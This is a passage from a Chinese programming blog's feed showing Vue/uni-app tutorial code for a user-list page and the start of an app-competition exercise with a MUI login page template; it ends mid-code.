punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>用户id:{{user.id}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>用户名:{{user.username}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>创建时间:{{user.createtime}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span><span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">"Hello"</span><span class="token punctuation">,</span><span class="token literal-property property">user_list</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment">// 当页面加载的时候会执行的代码</span><span class="token function">onLoad</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"你好"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">get_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token comment">// 获取用户的数据</span><span class="token function">get_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>uni<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">url</span><span class="token operator">:</span><span class="token string">"http://10.163.72.39:5555/user_get.php"</span><span class="token punctuation">,</span><span class="token literal-property property">method</span><span class="token operator">:</span><span class="token string">"GET"</span><span class="token punctuation">,</span><span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>user_list <span class="token operator">=</span> res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>dataconsole<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>user_list<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"><span class="token selector">.user_box</span><span class="token punctuation">{</span><span class="token property">margin</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span><span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> #cccccc<span class="token punctuation">;</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上这些代码除了做了一点美化排版，我还看到了<code>user.username</code>，这是什么意思呢？我们之前通过v-for循环，让<code>user_list</code>中的每一个<code>user</code>排队单独显示，每一个<code>user</code>都是一个对象，对象身上都是有各种属性的，就比如你的身高是多少，你的体重是多少，体重身高这些都是我们做为对象的属性，你玩的网络游戏中，你也会关心你培养的角色攻击力是多少，防御力是多少，这些统统都称为对象的属性。</p><p><code>user</code>这个对象中也有很多属性，在我们这个案例中，user有三个属性，分别是<code>id</code>,<code>username</code>,<code>createtime</code>,这些在请求回来的数据中都可以看到，我们这段代码就是分别显示用户的id、用户名、以及创建时间。</p><h1 id="5、删除用户"><a href="#5、删除用户" class="headerlink" title="5、删除用户"></a>5、删除用户</h1><p>我们这个项目本来还包括了删除用户的功能，但是可以预想到，一旦提供这个接口，肯定有人会去乱删别人的用户，这个在我们大课教学就没法实施了，到此为止，我们用户管理的页面就算是做完了，你们做完的话有时间还可以对页面再美化一下。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 项目教学 </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APP开发竞赛题目1</title>
      <link href="/2023/10/09/APP%E5%BC%80%E5%8F%91%E7%AB%9E%E8%B5%9B%E9%A2%98%E7%9B%AE1/"/>
      <url>/2023/10/09/APP%E5%BC%80%E5%8F%91%E7%AB%9E%E8%B5%9B%E9%A2%98%E7%9B%AE1/</url>
      
        <content type="html"><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>将内置浏览器插件放入HBuilderX中的plugins目录，然后打开软件，按照提示安装内置浏览器。</p><h1 id="通用模板muban-html"><a href="#通用模板muban-html" class="headerlink" title="通用模板muban.html"></a>通用模板muban.html</h1><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/mui.min.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/vue.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>css/mui.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">      mui<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">el</span><span class="token operator">:</span><span class="token string">'#root'</span><span class="token punctuation">,</span><span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">scoped</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="登录页面index-html"><a href="#登录页面index-html" class="headerlink" title="登录页面index.html"></a>登录页面index.html</h1><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/mui.min.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/vue.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>css/mui.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">      mui<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 标题栏（mheader） --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui-bar mui-bar-nav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui-title<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>智慧城市<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 主体内容（mbody） --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui-content<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 用户名&amp;密码输入框 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui-input-group<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">margin-top</span><span class="token punctuation">:</span> 5vh<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- mi --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui-input-row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span><span class="token punctuation">&gt;</span></span>账号<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui-input-clear<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请输入用户名<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui-input-row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span><span class="token punctuation">&gt;</span></span>密码<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui-input-password<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请输入密码<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 自动登录 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui-input-group<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">margin-top</span><span class="token punctuation">:</span> 2vh<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- msw --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui-input-row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span><span class="token punctuation">&gt;</span></span>自动登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui-switch mui-active<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui-switch-handle<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 登录 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>login()<span class="token punctuation">"</span></span><span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">width</span><span class="token punctuation">:</span> 90vw<span class="token punctuation">;</span><span class="token property">margin</span><span class="token punctuation">:</span>5vh 5vw<span class="token punctuation">;</span><span class="token property">border-radius</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui-btn mui-btn-blue mui-btn-block<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 注册账号 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flex_row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>signup.html<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>注册账号<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>|<span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>登录账号<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 快捷登录图标 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flex_row<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">margin-top</span><span class="token punctuation">:</span> 30vh<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/1.png<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/1.png<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/1.png<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">el</span><span class="token operator">:</span><span class="token string">'#root'</span><span class="token punctuation">,</span><span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token literal-property property">username</span><span class="token operator">:</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token literal-property property">password</span><span class="token operator">:</span><span class="token string">''</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>mui<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token string">'http://124.93.196.45:10001/prod-api/api/login'</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token literal-property property">username</span><span class="token operator">:</span><span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token punctuation">,</span><span class="token literal-property property">password</span><span class="token operator">:</span><span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token literal-property property">dataType</span><span class="token operator">:</span><span class="token string">'json'</span><span class="token punctuation">,</span><span class="token comment">//服务器返回json格式数据</span><span class="token literal-property property">type</span><span class="token operator">:</span><span class="token string">'post'</span><span class="token punctuation">,</span><span class="token comment">//HTTP请求类型</span><span class="token literal-property property">timeout</span><span class="token operator">:</span><span class="token number">10000</span><span class="token punctuation">,</span><span class="token comment">//超时时间设置为10秒；</span><span class="token literal-property property">headers</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token string-property property">'Content-Type'</span><span class="token operator">:</span><span class="token 